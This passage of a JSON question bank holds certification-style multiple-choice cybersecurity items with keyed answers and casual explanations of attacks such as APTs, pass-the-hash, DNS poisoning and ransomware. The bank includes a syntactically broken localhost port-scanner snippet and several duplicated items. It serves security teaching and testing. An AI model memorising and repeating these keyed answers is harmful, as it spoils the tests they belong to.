    "explanation": "This is a 'collision attack'. A 'hash' is a special one-way scramble of a password. A collision is when two different passwords just happen to produce the exact same scrambled hash. Attackers try to find these collisions because if they find a different password that has the same hash as yours, they can use it to log in as you."
  },
  {
    "question": "60. Farès is the network security administrator for a company that creates advanced routers and switches. He has discovered that his company's networks have been subjected to a series of advanced attacks over a period of time. What best describes this attack?",
    "correct_answer": "C. APT",
    "incorrect_answers": [
      "A. DDoS",
      "B. Brute force",
      "D. Disassociation attack"
    ],
    "explanation": "This sounds like an 'APT', which stands for Advanced Persistent Threat. This isn't a quick smash-and-grab. It's a long-term, stealthy, and very sophisticated attack, usually carried out by a government or a highly organised group. They are 'persistent' because they stay in the network for a long time, quietly stealing information."
  },
  {
    "question": "61. What type of information is phishing not commonly intended to acquire?",
    "correct_answer": "B. Email addresses",
    "incorrect_answers": [
      "A. Passwords",
      "C. Credit card numbers",
      "D. Personal information"
    ],
    "explanation": "Phishing attacks usually aren't trying to find email addresses – the attacker already has your email address, otherwise they couldn't have sent you the phishing email in the first place! They are trying to get the valuable stuff, like your passwords, bank details, or other personal info."
  },
  {
    "question": "62. John is running an IDS on his network. Users sometimes report that the IDS flags legitimate traffic as an attack. What describes this?",
    "correct_answer": "A. False positive",
    "incorrect_answers": [
      "B. False negative",
      "C. False trigger",
      "D. False flag"
    ],
    "explanation": "This is a 'false positive'. An IDS (Intrusion Detection System) is like a burglar alarm. A false positive is when the alarm goes off, but it was just the cat walking past the sensor. The system has flagged something as bad when it was actually harmless. A 'false negative' is the opposite and more dangerous: when a real burglar gets in and the alarm doesn't go off."
  },
  {
    "question": "63. Scott discovers that malware has been installed on one of the systems he is responsible for. Shortly afterward passwords used by the user that the system is assigned to are discovered to be in use by attackers. What type of malicious program should Scott look for on the compromised system?",
    "correct_answer": "B. A keylogger",
    "incorrect_answers": [
      "A. A rootkit",
      "C. A worm",
      "D. None of the above"
    ],
    "explanation": "Scott should be looking for a 'keylogger'. This is a type of spyware that secretly records every single key you press on your keyboard. It's a very common way for attackers to steal passwords, credit card numbers, and private messages."
  },
  {
    "question": "64. You are performing a penetration test of your company's network. As part of the test, you will be given a login with minimal access and will attempt to gain administrative access with this account. What is this called?",
    "correct_answer": "A. Privilege escalation",
    "incorrect_answers": [
      "B. Session hijacking",
      "C. Root grabbing",
      "D. Climbing"
    ],
    "explanation": "This is 'privilege escalation'. You start with a normal, low-level account (low 'privilege'), and then you try to find a way to 'escalate' your permissions to become a powerful user, like an administrator or 'root'. It's like starting as a post room clerk and trying to get the keys to the CEO's office."
  },
  {
    "question": "65. Matt discovers the following code on a system. What language is it written in, and what does it do?\nimport socket as skt\nfor port in range (1,9999):\ntry:\nsc=skt.socket(askt.AF_INET,skt.SOCK_STREAM)\nsc.settimeout(900)\nsc.connect(('127.0.0.1,port))\nprint '%d:OPEN' % (port)\nsc.close\nexcept: continue",
    "correct_answer": "B. Python, port scanning",
    "incorrect_answers": [
      "A. Perl, vulnerability scanning",
      "C. Bash, vulnerability scanning",
      "D. PowerShell, port scanning"
    ],
    "explanation": "This is a simple script written in Python. You can tell by the `import` and `for` loop syntax. It's a 'port scanner'. It's going through all the 'ports' (like numbered doors on a computer) from 1 to 9999 and trying to connect to each one. If it can connect, it prints that the port is 'OPEN'. It's a way of checking which services are running on a machine."
  },
  {
    "question": "66. Which of the following is commonly used in a distributed denial-of-service (DDoS) attack?",
    "correct_answer": "C. Botnet",
    "incorrect_answers": [
      "A. Phishing",
      "B. Adware",
      "D. Trojan"
    ],
    "explanation": "A 'botnet' is the go-to tool for a DDoS attack. A botnet is a huge network of infected computers that an attacker controls. They can command this whole army of 'bots' to flood a single target with traffic all at once, which is what makes the attack 'distributed' and so powerful."
  },
  {
    "question": "67. Mary has discovered that a web application used by her company does not always handle multithreading properly, particularly when multiple threads access the same variable. This could allow an attacker who discovered this vulnerability to exploit it and crash the server. What type of error has Mary discovered?",
    "correct_answer": "C. Race conditions",
    "incorrect_answers": [
      "A. Buffer overflow",
      "B. Logic bomb",
      "D. Improper error handling"
    ],
    "explanation": "This is a 'race condition'. Imagine two people trying to write on the same spot on a whiteboard at the exact same time. They'd make a mess. In computers, 'threads' are like different workers. If two threads try to use the same piece of memory at the same time without proper coordination, they can cause chaos, often crashing the program."
  },
  {
    "question": "68. An attacker is trying to get access to your network. He is sending users on your network a link to a new game with a hacked license code program. However, the game files also include software that will give the attacker access to any machine that it is installed on. What type of attack is this?",
    "correct_answer": "B. Trojan horse",
    "incorrect_answers": [
      "A. Rootkit",
      "C. Spyware",
      "D. Boot sector virus"
    ],
    "explanation": "This is a 'Trojan horse'. The attacker is hiding their malicious software inside something that looks fun or useful (the game). Just like the Greek soldiers hiding inside the wooden horse, the malware gets past your defences because it's disguised as a gift. When you install the game, you're also installing the baddy's software."
  },
  {
    "question": "69. The following image shows a report from an OpenVAS system. What type of weak configuration is shown here?",
    "correct_answer": "B. Unsecured administrative accounts",
    "incorrect_answers": [
      "A. Weak encryption",
      "C. Open ports and services",
      "D. Unsecure protocols"
    ],
    "explanation": "The report is pointing out an 'unsecured administrative account'. The database server has an admin account ('postgres') that is using a very simple, easy-to-guess password ('postgres'). This is a massive security no-no. It's like leaving the key to your house under the doormat with a big sign pointing to it."
  },
  {
    "question": "70. While conducting a penetration test, Annie scans for systems on the network she has gained access to. She discovers another system within the same network that has the same accounts and user types as the one she is on. Since she already has a valid user account on the system she has already accessed, she is able to log in to it. What type of technique is this?",
    "correct_answer": "A. Lateral movement",
    "incorrect_answers": [
      "B. Privilege escalation",
      "C. Privilege retention",
      "D. Vertical movement"
    ],
    "explanation": "This is 'lateral movement'. Annie has gotten into one computer, and now she is moving 'sideways' (laterally) to another computer with the same level of access. Attackers do this to explore the network, find more valuable targets, and spread out so they are harder to get rid of. It's like a burglar getting into one room and then quietly moving from room to room."
  },
  {
    "question": "71. Amanda scans a Red Hat Linux server that she believes is fully patched and discovers that the Apache version on the server is reported as vulnerable to an exploit from a few months ago. When she checks to see if she is missing patches, Apache is fully patched. What has occurred?",
    "correct_answer": "A. A false positive",
    "incorrect_answers": [
      "B. An automatic update failure",
      "C. A false negative",
      "D. An Apache version mismatch"
    ],
    "explanation": "This is a classic 'false positive'. The vulnerability scanner is like a burglar alarm that's gone off by mistake. It *thinks* there's a problem because it's looking at the software's version number, but it doesn't realise that Red Hat has fixed the security hole without changing the version number. So, the alarm is false, and the system is actually safe."
  },
  {
    "question": "72. When a program has variables, especially arrays, and does not check the boundary values before inputting data, what attack is the program vulnerable to?",
    "correct_answer": "C. Buffer overflow",
    "incorrect_answers": [
      "A. XSS",
      "B. CSRF",
      "D. Logic bomb"
    ],
    "explanation": "This leads to a 'buffer overflow'. A 'buffer' is just a space in the computer's memory to hold some data, like a box. If the program doesn't check how much data it's trying to stuff into the box, an attacker can send way too much, causing it to 'overflow'. This can crash the program or, even worse, let the attacker sneak in their own malicious code."
  },
  {
    "question": "73. Tracy is concerned that the software she wants to download may not be trustworthy, so she searches for it and finds many postings claiming that the software is legitimate. If she installs the software and later discovers it is malicious and that malicious actors have planted those reviews, what principle of social engineering have they used?",
    "correct_answer": "C. Consensus",
    "incorrect_answers": [
      "A. Scarcity",
      "B. Familiarity",
      "D. Trust"
    ],
    "explanation": "The attackers are using 'consensus', also known as 'social proof'. They've created lots of fake reviews to make it look like everyone agrees that the software is great. People tend to trust what the crowd is doing, so if lots of 'people' are saying it's good, we're more likely to believe them and install it. It's a sneaky trick."
  },
  {
    "question": "74. Which of the following best describes malware that will execute some malicious activity when a particular condition is met (i.e., if the condition is met, then executed)?",
    "correct_answer": "B. Logic bomb",
    "incorrect_answers": [
      "A. Boot sector virus",
      "C. Buffer overflow",
      "D. Sparse infector virus"
    ],
    "explanation": "This is a 'logic bomb'. It's a piece of malicious code that just sits there, waiting quietly. It only 'explodes' and does its damage when a specific condition is met – for example, on a certain date, or if a particular person's name is removed from the employee list. It's a ticking time bomb of code."
  },
  {
    "question": "75. What term describes using conversational tactics as part of a social engineering exercise to extract information from targets?",
    "correct_answer": "B. Elicitation",
    "incorrect_answers": [
      "A. Pretexting",
      "C. Impersonation",
      "D. Intimidation"
    ],
    "explanation": "This is called 'elicitation'. It's the art of steering a conversation to get someone to give you information without them realising they're doing it. It's not about lying directly ('pretexting') or pretending to be someone else ('impersonation'); it's about asking clever, casual questions to slowly 'elicit' the secrets you want."
  },
  {
    "question": "76. Telnet, RSH, and FTP are all examples of what?",
    "correct_answer": "B. Unsecure protocols",
    "incorrect_answers": [
      "A. File transfer protocols",
      "C. Core protocols",
      "D. Open ports"
    ],
    "explanation": "These are all old and 'unsecure protocols'. A 'protocol' is just a set of rules for how computers talk to each other. These old ones are unsecure because they send everything, including passwords, in plain text that anyone can read. Modern, secure versions like SSH and SFTP should always be used instead."
  },
  {
    "question": "77. Scott wants to determine where an organization's wireless network can be accessed from. What testing techniques are his most likely options?",
    "correct_answer": "B. War driving and war flying",
    "incorrect_answers": [
      "A. OSINT and active scans",
      "C. Social engineering and active scans",
      "D. OSINT and war driving"
    ],
    "explanation": "'War driving' is when you drive around in a car with a laptop, mapping out all the Wi-Fi networks you can find. 'War flying' is the same idea, but using a drone to get a bird's-eye view. It's a way of figuring out how far a company's Wi-Fi signal reaches and where the weak spots might be."
  },
  {
    "question": "78. Gerald is a network administrator for a small financial services company. Users are reporting odd behavior that appears to be caused by a virus on their machines. After isolating the machines that he believes are infected, Gerald analyzes them. He finds that all the infected machines received an email purporting to be from accounting, with an Excel spreadsheet, and the users opened the spreadsheet. What is the most likely issue on these machines?",
    "correct_answer": "A. A macro virus",
    "incorrect_answers": [
      "B. A boot sector virus",
      "C. A Trojan horse",
      "D. A RAT"
    ],
    "explanation": "This is almost certainly a 'macro virus'. Macros are little bits of code you can put inside Office documents, like Excel spreadsheets, to automate tasks. Baddies use them to hide viruses. When the user opens the spreadsheet and enables macros, the virus runs and infects their computer. It's a very common way to spread malware through email."
  },
  {
    "question": "79. Your company has hired an outside security firm to perform various tests of your network. During the vulnerability scan, you will provide that company with logins for various systems (i.e., database server, application server, web server, etc.) to aid in their scan. What best describes this?",
    "correct_answer": "C. A credentialed scan",
    "incorrect_answers": [
      "A. A known environment test",
      "B. A gray-box test",
      "D. An intrusive scan"
    ],
    "explanation": "This is a 'credentialed scan'. It means you're giving the testers a username and password ('credentials') so they can log in and look around from the inside. This gives them a much more detailed view and allows them to find problems that you wouldn't be able to see from the outside."
  },
  {
    "question": "80. Steve discovers the following code on a system. What language is it written in, and what does it do?\nimport socket as skt\nfor port in range (1,9999):\ntry:\nsc=skt.socket(askt.AF_INET,skt.SOCK_STREAM)\nsc.settimeout(900)\nsc.connect(('127.0.0.1,port))\nprint '%d:OPEN' % (port)\nsc.close\nexcept: continue",
    "correct_answer": "B. Python, port scanning",
    "incorrect_answers": [
      "A. Perl, vulnerability scanning",
      "C. Bash, vulnerability scanning",
      "D. PowerShell, port scanning"
    ],
    "explanation": "This is a simple script written in Python. You can tell by the `import` and `for` loop syntax. It's a 'port scanner'. It's going through all the 'ports' (like numbered doors on a computer) from 1 to 9999 and trying to connect to each one. If it can connect, it prints that the port is 'OPEN'. It's a way of checking which services are running on a machine."
  },
  {
    "question": "81. Which of the following is commonly used in a distributed denial-of-service (DDoS) attack?",
    "correct_answer": "C. Botnet",
    "incorrect_answers": [
      "A. Phishing",
      "B. Adware",
      "D. Trojan"
    ],
    "explanation": "A 'botnet' is the go-to tool for a DDoS attack. A botnet is a huge network of infected computers that an attacker controls. They can command this whole army of 'bots' to flood a single target with traffic all at once, which is what makes the attack 'distributed' and so powerful."
  },
  {
    "question": "82. Amanda discovers that a member of her organization's staff has installed a remote access Trojan on their accounting software server and has been accessing it remotely. What type of threat has she discovered?",
    "correct_answer": "B. Insider threat",
    "incorrect_answers": [
      "A. Zero-day",
      "C. Misconfiguration",
      "D. Weak encryption"
    ],
    "explanation": "Amanda has found an 'insider threat'. This is when the danger comes from someone inside the company. This person is using their trusted position to do something dodgy. Insider threats are often the hardest to spot because the person already has legitimate access to the systems."
  },
  {
    "question": "83. Postings from Russian agents during the 2016 U.S. presidential campaign to Facebook and Twitter are an example of what type of effort?",
    "correct_answer": "B. A social media influence campaign",
    "incorrect_answers": [
      "A. Impersonation",
      "C. Asymmetric warfare",
      "D. A watering hole attack"
    ],
    "explanation": "This is a 'social media influence campaign'. It's when a group or a government tries to secretly influence public opinion by spreading fake news, creating arguments, and promoting certain ideas on platforms like Facebook and Twitter. The goal is to change how people think or vote."
  },
  {
    "question": "84. Juan is responsible for incident response at a large financial institution. He discovers that the company Wi-Fi has been breached. The attacker used the same login credentials that ship with the wireless access point (WAP). The attacker was able to use those credentials to access the WAP administrative console and make changes. Which of the following best describes what caused this vulnerability to exist?",
    "correct_answer": "C. Using default settings",
    "incorrect_answers": [
      "A. Improperly configured accounts",
      "B. Untrained users",
      "D. Failure to patch systems"
    ],
    "explanation": "The problem here was 'using default settings'. Many devices, like Wi-Fi routers, come with a standard username and password (like 'admin' and 'password'). It's really important to change these straight away, because hackers know all the default passwords and will try them first. It's one of the simplest but most common security mistakes."
  },
  {
    "question": "85. Elizabeth is investigating a network breach at her company. She discovers a program that was able to execute code within the address space of another process by using the target process to load a specific library. What best describes this attack?",
    "correct_answer": "D. DLL injection",
    "incorrect_answers": [
      "A. Logic bomb",
      "B. Session hijacking",
      "C. Buffer overflow"
    ],
    "explanation": "This is a 'DLL injection'. A DLL is a 'Dynamic Link Library' – a file containing code that lots of programs can share. In this attack, the malware tricks a legitimate program into loading a malicious DLL file. This allows the malware's code to run with the same permissions as the legitimate program, which is very sneaky."
  },
  {
    "question": "86. Which of the following threat actors is most likely to be associated with an advanced persistent threat (APT)?",
    "correct_answer": "B. State actors",
    "incorrect_answers": [
      "A. Hacktivists",
      "C. Script kiddies",
      "D. Insider threats"
    ],
    "explanation": "'State actors' are the ones usually behind an APT. An APT is a very slow, quiet, and clever attack that can last for years. It takes a lot of time, money, and skill, which is why it's normally governments (or 'states') that have the resources to do it. Their goal is usually to spy or cause major disruption."
  },
  {
    "question": "87. What is the primary difference between an intrusive and a nonintrusive vulnerability scan?",
    "correct_answer": "C. An intrusive scan could potentially disrupt operations.",
    "incorrect_answers": [
      "A. An intrusive scan is a penetration test.",
      "B. A nonintrusive scan is just a document check.",
      "D. A nonintrusive scan won't find most vulnerabilities."
    ],
    "explanation": "The key difference is that an 'intrusive' scan is a bit more aggressive. A 'non-intrusive' scan just looks for problems without touching anything, like window shopping. An 'intrusive' scan actually tries to test the vulnerabilities it finds, which is a bit like rattling the windows to see if they'll break. Because of this, there's a small chance it could cause the system to crash or stop working."
  },
  {
    "question": "88. Your company outsourced development of an accounting application to a local programming firm. After three months of using the product, one of your administrators discovers that the developers have inserted a way to log in and bypass all security and authentication. What best describes this?",
    "correct_answer": "C. Backdoor",
    "incorrect_answers": [
      "A. Logic bomb",
      "B. Trojan horse",
      "D. Rootkit"
    ],
    "explanation": "This is a 'backdoor'. The developers have deliberately left a secret way into the program that lets them bypass all the normal security. It's like a builder leaving a secret, hidden door in a house that only they know about. It could be for maintenance, but it's a massive security risk if a baddy finds it."
  },
  {
    "question": "89. Daryl is investigating a recent breach of his company's web server. The attacker used sophisticated techniques and then defaced the website, leaving messages that were denouncing the company's public policies. He and his team are trying to determine the type of actor who most likely committed the breach. Based on the information provided, who was the most likely threat actor?",
    "correct_answer": "D. Hacktivists",
    "incorrect_answers": [
      "A. A script",
      "B. A nation-state",
      "C. Organized crime"
    ],
    "explanation": "The clues point to 'hacktivists'. The attacker didn't steal money or data; they changed the website to display a political message. Hacktivists are hackers who are motivated by a political or social cause. They use hacking as a form of protest, a bit like digital graffiti."
  },
  {
    "question": "90. What two techniques are most commonly associated with a pharming attack?",
    "correct_answer": "A. Modifying the hosts file on a PC or exploiting a DNS vulnerability on a trusted DNS server",
    "incorrect_answers": [
      "B. Phishing many users and harvesting email addresses from them",
      "C. Phishing many users and harvesting many passwords from them",
      "D. Spoofing DNS server IP addresses or modifying the hosts file on a PC"
    ],
    "explanation": "'Pharming' is like phishing, but on a bigger scale. Instead of tricking one person with an email, a pharming attack hijacks the system that turns website names into addresses (the DNS). They can either poison the main DNS server or just change a little file on your own PC called the 'hosts file'. Either way, when you type in a real website address, you get sent to a fake one."
  },
  {
    "question": "91. Angela reviews the authentication logs for her website and sees attempts from many different accounts using the same set of passwords. What is this attack technique called?",
    "correct_answer": "B. Password spraying",
    "incorrect_answers": [
      "A. Brute forcing",
      "C. Limited login attacks",
      "D. Account spinning"
    ],
    "explanation": "This is 'password spraying'. Instead of trying a million passwords on one account (which would lock it out), the attacker takes one or two very common passwords (like 'Password123') and 'sprays' them across hundreds of different accounts. They're hoping to find someone who has used that simple password."
  },
  {
    "question": "92. When investigating breaches and attempting to attribute them to specific threat actors, which of the following is not one of the indicators of an APT?",
    "correct_answer": "C. The attack comes from a foreign IP address.",
    "incorrect_answers": [
      "A. Long-term access to the target",
      "B. Sophisticated attacks",
      "D. The attack is sustained over time."
    ],
    "explanation": "Just because an attack comes from a foreign country doesn't mean it's an APT (Advanced Persistent Threat). Clever APTs often hide their tracks by routing their attacks through computers in many different countries, including the target's own country. The real clues are that the attack is very clever ('advanced'), and it goes on for a very long time ('persistent')."
  },
  {
    "question": "93. Charles discovers that an attacker has used a vulnerability in a web application that his company runs and has then used that exploit to obtain root privileges on the web server. What type of attack has he discovered?",
    "correct_answer": "B. Privilege escalation",
    "incorrect_answers": [
      "A. Cross-site scripting",
      "C. A SQL injection",
      "D. A race condition"
    ],
    "explanation": "This is 'privilege escalation'. The attacker started out by exploiting a small weakness in the web application, which probably gave them very limited access. But from there, they found another weakness that let them 'escalate' their 'privileges' all the way up to 'root' – the most powerful user on the server. They've gone from a guest to the king of the castle."
  },
  {
    "question": "94. What type of attack uses a second wireless access point (WAP) that broadcasts the same SSID as a legitimate access point, in an attempt to get users to connect to the attacker's WAP?",
    "correct_answer": "A. Evil twin",
    "incorrect_answers": [
      "B. IP spoofing",
      "C. Trojan horse",
      "D. Privilege escalation"
    ],
    "explanation": "This is an 'evil twin' attack. The attacker sets up their own Wi-Fi hotspot right next to a real one (like in a coffee shop) and gives it the exact same name (the 'SSID'). Your phone or laptop might automatically connect to the 'evil twin' because it has a stronger signal. Once you're connected, the attacker can see everything you do online."
  },
  {
    "question": "95. Which of the following best describes a zero-day vulnerability?",
    "correct_answer": "A. A vulnerability that the vendor is not yet aware of",
    "incorrect_answers": [
      "B. A vulnerability that has not yet been breached",
      "C. A vulnerability that can be quickly exploited (i.e., in zero days)",
      "D. A vulnerability that will give the attacker brief access (i.e., zero days)"
    ],
    "explanation": "A 'zero-day' vulnerability is a security hole that the software makers don't know about yet. This makes it very dangerous, because there's no patch or fix available. It's called 'zero-day' because the developers have had zero days to prepare for an attack that uses it."
  },
  {
    "question": "96. What type of attack involves adding an expression or phrase such as adding “SAFE” to mail headers?",
    "correct_answer": "D. Prepending",
    "incorrect_answers": [
      "A. Pretexting",
      "B. Phishing",
      "C. SQL injection"
    ],
    "explanation": "This is called 'prepending'. It just means adding something to the beginning of a piece of text. In email security, a system might 'prepend' the word '[SAFE]' or '[EXTERNAL]' to the subject line of an email to give the user a quick visual clue about whether the email is from a trusted source or not."
  },
  {
    "question": "97. Charles wants to ensure that his outsourced code development efforts are as secure as possible. Which of the following is not a common practice to ensure secure remote code development?",
    "correct_answer": "D. Audit all underlying libraries used in the code.",
    "incorrect_answers": [
      "A. Ensure developers are trained on secure coding techniques.",
      "B. Set defined acceptance criteria for code security.",
      "C. Test code using automated and manual security testing systems."
    ],
    "explanation": "While it's important to be careful, auditing *every single library* is often impossible. Modern software is built using hundreds of open-source building blocks ('libraries'). It's more practical to train the developers, test the final code thoroughly, and have clear security rules in the contract, rather than trying to check every single brick used to build the house."
  },
  {
    "question": "98. You have discovered that there are entries in your network's domain name server that point legitimate domains to unknown and potentially harmful IP addresses. What best describes this type of attack?",
    "correct_answer": "C. DNS poisoning",
    "incorrect_answers": [
      "A. A backdoor",
      "B. An APT",
      "D. A Trojan horse"
    ],
    "explanation": "This is 'DNS poisoning'. The DNS is like the internet's address book. This attack is like a baddy sneaking into the library and scribbling out the real address for 'mybank.com' and writing in the address of their own fake website. When you try to go to your bank, the poisoned address book sends you to the wrong place."
  },
  {
    "question": "99. Spyware is an example of what type of malicious software?",
    "correct_answer": "C. A PUP",
    "incorrect_answers": [
      "A. A CAT",
      "B. A worm",
      "D. A Trojan"
    ],
    "explanation": "Spyware is often classed as a 'PUP', which stands for Potentially Unwanted Programme. It's not always a full-blown nasty virus, but it's software that gets on your computer without you really wanting it there, and it does things you don't like, such as spying on you or showing you adverts."
  },
  {
    "question": "100. What best describes an attack that attaches some malware to a legitimate program so that when the user installs the legitimate program, they inadvertently install the malware?",
    "correct_answer": "B. Trojan horse",
    "incorrect_answers": [
      "A. Backdoor",
      "C. RAT",
      "D. Polymorphic virus"
    ],
    "explanation": "This is a perfect description of a 'Trojan horse'. The malware hides inside a program that looks useful or fun. You download and install the program because you want it, but you don't realise you're also installing the hidden malware at the same time. It's a classic bait-and-switch trick."
  }
  ],
  "set2": [
    {
      "question": "101. Which of the following best describes software that will provide the attacker with remote access to the victim's machine but that is wrapped with a legitimate program in an attempt to trick the victim into installing it?",
      "correct_answer": "A. RAT",
      "incorrect_answers": [
        "B. Backdoor",
        "C. Trojan horse",
        "D. Macro virus"
      ],
      "explanation": "This is a 'RAT', which is short for Remote Access Trojan. It's a specific type of 'Trojan horse' that gives an attacker complete remote control over your computer. They can see your screen, move your mouse, and type on your keyboard, all from miles away. It's one of the nastiest types of malware."
    },
    {
      "question": "102. What process typically occurs before card cloning attacks occur?",
      "correct_answer": "B. A skimming attack",
      "incorrect_answers": [
        "A. A brute-force attack",
        "C. A rainbow table attack",
        "D. A birthday attack"
      ],
      "explanation": "Before a baddy can clone a card, they first need to steal the card's data. This is usually done with a 'skimming' attack. They might put a sneaky little device on a cash machine or a petrol pump that reads your card's magnetic stripe and records your PIN when you're not looking. Once they have that data, they can make a copy, or 'clone', of your card."
    },
    {
      "question": "103. Which of the following is an attack that seeks to attack a website, based on the website's trust of an authenticated user?",
      "correct_answer": "B. XSRF",
      "incorrect_answers": [
        "A. XSS",
        "C. Buffer overflow",
        "D. RAT"
      ],
      "explanation": "This is 'XSRF', which stands for Cross-Site Request Forgery. It's a clever trick where an attacker forces a logged-in user to send an unwanted request to a website they trust. For example, you could be logged into your social media, and you click a link on another site that secretly makes you 'like' a page you didn't want to. The website trusts the action because it came from you."
    },
    {
      "question": "104. Valerie is responsible for security testing applications in her company. She has discovered that a web application, under certain conditions, can generate a memory leak. What type of attack would this leave the application vulnerable to?",
      "correct_answer": "A. DoS",
      "incorrect_answers": [
        "B. Backdoor",
        "C. SQL injection",
        "D. Buffer overflow"
      ],
      "explanation": "A 'memory leak' can lead to a 'DoS' (Denial of Service) attack. Imagine a program that keeps asking for bits of memory but never gives them back. Eventually, it will use up all the available memory on the server, and the server will crash or stop working. An attacker can use this to take the website offline."
    },
    {
      "question": "105. The mobile game that Jack has spent the last year developing has been released, and malicious actors are sending traffic to the server that runs it to prevent it from competing with other games in the App Store. What type of denial-of-service attack is this?",
      "correct_answer": "D. An application DDoS",
      "incorrect_answers": [
        "A. A network DDoS",
        "B. An operational technology DDoS",
        "C. A GDoS"
      ],
      "explanation": "This is an 'application DDoS'. The attack isn't just flooding the whole network with junk; it's specifically targeting the game's application server. It's sending requests that the game has to process, which uses up all the server's power so that real players can't connect. It's a more focused kind of DDoS attack."
    },
    {
      "question": "106. Charles has been tasked with building a team that combines techniques from attackers and defenders to help protect his organization. What type of team is he building?",
      "correct_answer": "D. A purple team",
      "incorrect_answers": [
        "A. A red team",
        "B. A blue team",
        "C. A white team"
      ],
      "explanation": "Charles is building a 'Purple Team'. In cybersecurity, the attackers are the 'Red Team' and the defenders are the 'Blue Team'. A Purple Team is when you mix the two colours together. The attackers and defenders work side-by-side, sharing what they know to make the company's defences as strong as possible."
    },
    {
      "question": "107. Mike is a network administrator with a small financial services company. He has received a pop-up window that states his files are now encrypted and he must pay .5 bitcoins to get them decrypted. He tries to check the files in question, but their extensions have changed, and he cannot open them. What best describes this situation?",
      "correct_answer": "B. Mike's machine has ransomware.",
      "incorrect_answers": [
        "A. Mike's machine has a rootkit.",
        "C. Mike's machine has a logic bomb.",
        "D. Mike's machine has been the target of whaling."
      ],
      "explanation": "This is a nasty piece of work called 'ransomware'. The malware has scrambled (encrypted) all of Mike's files and is now demanding a ransom payment (usually in cryptocurrency like Bitcoin) to give him the key to unscramble them. It's the digital equivalent of kidnapping your data."
    },
    {
      "question": "108. When a multithreaded application does not properly handle various threads accessing a common value, and one thread can change the data while another thread is relying on it, what flaw is this?",
      "correct_answer": "D. Time of check/time of use",
      "incorrect_answers": [
        "A. Memory leak",
        "B. Buffer overflow",
        "C. Integer overflow"
      ],
      "explanation": "This is a 'Time of Check/Time of Use' problem, also known as a race condition. Imagine this: a program checks if a file is safe ('time of check'), but before it actually opens the file ('time of use'), a baddy quickly swaps the safe file with a malicious one. The program thinks it's opening the safe file, but it's been tricked. It's all about exploiting that tiny gap in time."
    },
    {
      "question": "109. Acme Company is using smartcards that use near-field communication (NFC) rather than needing to be swiped. This is meant to make physical access to secure areas more secure. What vulnerability might this also create?",
      "correct_answer": "B. Eavesdropping",
      "incorrect_answers": [
        "A. Tailgating",
        "C. IP spoofing",
        "D. Race conditions"
      ],
      "explanation": "NFC works by sending a radio signal over a very short distance. The problem is, an attacker with a sensitive enough antenna can 'eavesdrop' on that signal from further away than you'd think. They could potentially capture the information being sent between the card and the reader and use it to create a clone of the card."
    },
    {
      "question": "110. Rick believes that Windows systems in his organization are being targeted by fileless viruses. If he wants to capture artifacts of their infection process, which of the following options is most likely to provide him with a view into what they are doing?",
      "correct_answer": "B. Turning on PowerShell logging",
      "incorrect_answers": [
        "A. Reviewing full-disk images of infected machines",
        "C. Disabling the administrative user account",
        "D. Analyzing Windows crash dump files"
      ],
      "explanation": "'Fileless' viruses are extra sneaky because they don't save a file on the computer; they run entirely in memory. They often use a powerful built-in Windows tool called 'PowerShell' to do their dirty work. By turning on PowerShell logging, Rick can create a diary of everything PowerShell does, which might give him the clues he needs to spot the virus's activity."
    },
    {
      "question": "111. John is responsible for physical security at a large manufacturing plant. Employees all use a smartcard in order to open the front door and enter the facility. Which of the following is a common way attackers would circumvent this system?",
      "correct_answer": "B. Tailgating",
      "incorrect_answers": [
        "A. Phishing",
        "C. Spoofing the smartcard",
        "D. RFID spoofing"
      ],
      "explanation": "The easiest way to get past a smartcard door is often 'tailgating'. This is just a fancy word for following someone who has a real card through the door before it closes. It's a very low-tech attack that relies on people being too polite or not paying attention. It's much easier than trying to hack the card itself!"
    },
    {
      "question": "112. Adam wants to download lists of malicious or untrustworthy IP addresses and domains using STIX and TAXII. What type of service is he looking for?",
      "correct_answer": "B. A threat feed",
      "incorrect_answers": [
        "A. A vulnerability feed",
        "C. A hunting feed",
        "D. A rule feed"
      ],
      "explanation": "Adam is looking for a 'threat feed'. This is a constantly updated list of bad stuff on the internet, like the addresses of servers known to be sending spam or hosting malware. STIX and TAXII are just the standard languages that these feeds use to share the information so that different security tools can understand it."
    },
    {
      "question": "113. During an incident investigation, Naomi notices that a second keyboard was plugged into a system in a public area of her company's building. Shortly after that event, the system was infected with malware, resulting in a data breach. What should Naomi look for in her in-person investigation?",
      "correct_answer": "B. A malicious USB cable or drive",
      "incorrect_answers": [
        "A. A Trojan horse download",
        "C. A worm",
        "D. None of the above"
      ],
      "explanation": "The clue here is the second keyboard. Naomi should suspect a 'malicious USB' device, like a 'BadUSB'. These look like normal USB sticks or cables, but they secretly act like a keyboard. When plugged in, they can automatically type in malicious commands to infect the computer. It's a very sneaky hardware attack."
    },
    {
      "question": "114. You are responsible for incident response at Acme Corporation. You have discovered that someone has been able to circumvent the Windows authentication process for a specific network application. It appears that the attacker took the stored hash of the password and sent it directly to the backend authentication service, bypassing the application. What type of attack is this?",
      "correct_answer": "D. Pass the hash",
      "incorrect_answers": [
        "A. Hash spoofing",
        "B. Evil twin",
        "C. Shimming"
      ],
      "explanation": "This is a 'pass the hash' attack. Instead of stealing your actual password, the attacker steals the scrambled version (the 'hash'). In some older Windows systems, they can then just 'pass the hash' directly to the server to log in, without ever needing to know the original password. It's like finding the bouncer's special stamp and just stamping your own hand to get into the club."
    },
    {
      "question": "115. A user in your company reports that she received a call from someone claiming to be from the company technical support team. The caller stated that there was a virus spreading through the company and they needed immediate access to the employee's computer to stop it from being infected. What social-engineering principles did the caller use to try to trick the employee?",
      "correct_answer": "B. Urgency and authority",
      "incorrect_answers": [
        "A. Urgency and intimidation",
        "C. Authority and trust",
        "D. Intimidation and authority"
      ],
      "explanation": "The caller is using 'authority' by pretending to be from the tech support team, which sounds official. They are also using 'urgency' by saying there's a virus spreading and they need to act *right now*. This combination is designed to make the employee panic and give the caller access without thinking."
    },
    {
      "question": "116. After running a vulnerability scan, Elaine discovers that the Windows 10 workstations in her company's warehouse are vulnerable to multiple known Windows exploits. What should she identify as the root cause in her report to management?",
      "correct_answer": "B. Improper or weak patch management for the operating systems",
      "incorrect_answers": [
        "A. Unsupported operating systems",
        "C. Improper or weak patch management for the firmware of the systems",
        "D. Use of unsecure protocols"
      ],
      "explanation": "Since the computers are running a modern system (Windows 10) but have known problems, the most likely cause is 'improper patch management'. This just means that the computers haven't been updated properly. Microsoft releases security updates ('patches') all the time to fix these holes, and if you don't install them, you're leaving the door wide open for hackers."
    },
    {
